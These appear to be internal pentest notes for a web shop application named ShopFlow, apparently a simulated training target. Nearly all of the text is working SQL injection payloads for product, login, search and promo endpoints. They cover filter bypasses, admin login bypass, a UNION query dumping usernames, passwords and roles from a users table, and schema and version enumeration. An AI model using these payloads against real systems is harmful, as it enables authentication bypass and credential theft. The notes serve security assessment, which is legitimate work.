Pentest Notes – ShopFlow

Internal exploitation reference for security assessors.

WHERE Injection VULN-1 · Hidden Product Disclosure

Endpoint: GET /products?category=X
The query filters with AND released = 1, hiding unreleased products.

GET /products?category=Electronics'+OR+1=1-- GET /products?category='+OR+released=0-- GET /products?category='+UNION+SELECT+id,username,password,email,role+FROM+users--

Auth Bypass VULN-2 · Login Bypass

Endpoint: POST /login — both username and password fields are injectable.

username=admin'--&password=anything username=' OR '1'='1'--&password=x username=' OR 1=1--&password=x

UNION VULN-3 · DB Version (Oracle sim) via Search

Endpoint: GET /search?q=X — 2-column UNION. Oracle uses v$version; here use version().

GET /search?q='+UNION+SELECT+version(),NULL-- GET /search?q='+UNION+SELECT+current_database(),current_user-- GET /search?q='+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables--

UNION VULN-4 · DB Version (MySQL sim) via Promo

Endpoint: POST /promo — code field. 2-column UNION. MySQL/MSSQL use @@version; PG uses version().

code=' UNION SELECT version(),'1'-- code=' UNION SELECT current_user,'100'-- code=' UNION SELECT table_name,'0'+FROM+information_schema.tables+LIMIT+1--
